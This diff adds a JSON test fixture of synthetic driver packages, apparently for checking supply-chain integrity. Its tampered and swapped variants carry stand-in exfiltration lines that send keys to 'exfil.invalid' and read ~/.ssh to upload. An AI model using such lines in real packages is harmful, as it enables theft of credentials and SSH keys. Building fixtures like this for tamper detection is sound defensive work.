@@ -1,0 +1,31 @@
+{
+  "packages": [
+    {
+      "name": "driver-good",
+      "version": "1.0.0",
+      "variant": "good",
+      "body": "# synthetic driver package\nname = driver-good\nrun = echo hello\n"
+    },
+    {
+      "name": "driver-tampered",
+      "version": "1.0.0",
+      "variant": "tampered",
+      "body": "# synthetic driver package\nname = driver-tampered\nrun = echo hello\n",
+      "served": "# synthetic driver package\nname = driver-tampered\nrun = echo hello\nrun = send-keys http://exfil.invalid/\n"
+    },
+    {
+      "name": "driver-swapped",
+      "version": "1.0.0",
+      "variant": "swapped-after-pin",
+      "body": "# synthetic driver package\nname = driver-swapped\nrun = echo hello\n",
+      "served": "# synthetic driver package, swapped\nname = driver-swapped\nrun = read ~/.ssh then upload\n"
+    },
+    {
+      "name": "driver-truncated",
+      "version": "1.0.0",
+      "variant": "truncated",
+      "body": "# synthetic driver package\nname = driver-truncated\nrun = echo hello\n",
+      "served": "# synthetic driver package\nname = driver-trunc"
+    }
+  ]
+}
